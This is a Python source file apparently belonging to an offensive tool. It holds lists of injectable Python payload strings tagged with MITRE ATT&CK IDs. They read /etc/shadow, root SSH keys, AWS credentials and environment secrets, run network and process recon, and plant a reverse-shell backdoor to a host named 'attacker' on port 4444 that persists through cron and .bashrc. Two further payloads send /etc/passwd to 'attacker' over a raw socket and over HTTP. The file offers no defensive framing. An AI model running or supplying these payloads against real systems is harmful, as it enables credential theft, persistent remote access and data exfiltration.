#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Apr 27 11:52:11 2026

@author: hounsousamuel
"""

DEFAULT_PYTHON_PAYLOADS = {

    # ─────────────────────────────────────────────
    # SYSTEM INFO — T1082
    # ─────────────────────────────────────────────
    "system_info": [
        "import platform; print(platform.uname())",
        "import platform; print(platform.system(), platform.release())",
        "import socket; print(socket.gethostname(), socket.gethostbyname(socket.gethostname()))",
        "import os; print(os.uname())",
        "import os; print(os.cpu_count())",
    ],

    # ─────────────────────────────────────────────
    # FILES — T1005
    # ─────────────────────────────────────────────
    "files": [
        "import os; print(os.listdir('/home'))",
        "import os; print(os.listdir('/root'))",
        "import os; print(os.listdir('/tmp'))",
        "import os; [print(os.path.join(r,f)) for r,d,fs in os.walk('/home') for f in fs]",
        "open('/etc/passwd').read()",
        "open('/etc/shadow').read()",
        "open('/root/.ssh/id_rsa').read()",
        "open('/root/.bash_history').read()",
    ],

    # ─────────────────────────────────────────────
    # CREDENTIALS — T1552
    # ─────────────────────────────────────────────
    "credentials": [
        "import os; print(dict(os.environ))",
        "open('/root/.aws/credentials').read()",
        "import os; [print(os.path.join(r,f)) for r,d,fs in os.walk('/') for f in fs if f.endswith(('.env','.key','.pem'))]",
        "open('/root/.ssh/authorized_keys').read()",
    ],

    # ─────────────────────────────────────────────
    # NETWORK — T1016
    # ─────────────────────────────────────────────
    "network": [
        "import socket; print(socket.gethostbyname(socket.gethostname()))",
        "import subprocess; print(subprocess.check_output('netstat -tuln', shell=True).decode())",
        "import subprocess; print(subprocess.check_output('ss -tuln', shell=True).decode())",
        "import subprocess; print(subprocess.check_output('ip addr', shell=True).decode())",
    ],

    # ─────────────────────────────────────────────
    # PROCESS — T1057
    # ─────────────────────────────────────────────
    "processes": [
        "import subprocess; print(subprocess.check_output('ps aux', shell=True).decode())",
        "import os; print([f for f in os.listdir('/proc') if f.isdigit()])",
    ],

    # ─────────────────────────────────────────────
    # PERSISTENCE — T1053.003
    # ─────────────────────────────────────────────
    "persistence": [
        "open('/tmp/backdoor.py','w').write('import socket,os,subprocess\\ns=socket.socket()\\ns.connect((\"attacker\",4444))\\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\\nsubprocess.call([\"/bin/bash\",\"-i\"])')",
        "open('/etc/cron.d/backdoor','w').write('* * * * * root python3 /tmp/backdoor.py')",
        "open('/root/.bashrc','a').write('\\npython3 /tmp/backdoor.py &')",
    ],

    # ─────────────────────────────────────────────
    # EXFILTRATION — T1041
    # ─────────────────────────────────────────────
    "exfiltration": [
        "import socket; s=socket.socket(); s.connect(('attacker',5555)); s.send(open('/etc/passwd','rb').read()); s.close()",
        "import urllib.request; urllib.request.urlopen('http://attacker/collect?data='+open('/etc/passwd').read())",
    ],
}

# Quick payloads pour recon initiale
QUICK_PYTHON_RECON = [
    "import platform; print(platform.uname())",
    "import os; print(dict(os.environ))",
    "import os; print(os.listdir('/'))",
    "import socket; print(socket.gethostname())",
    "open('/etc/passwd').read()",
]

# Flat list
ALL_PYTHON_PAYLOADS = [p for payloads in DEFAULT_PYTHON_PAYLOADS.values() for p in payloads]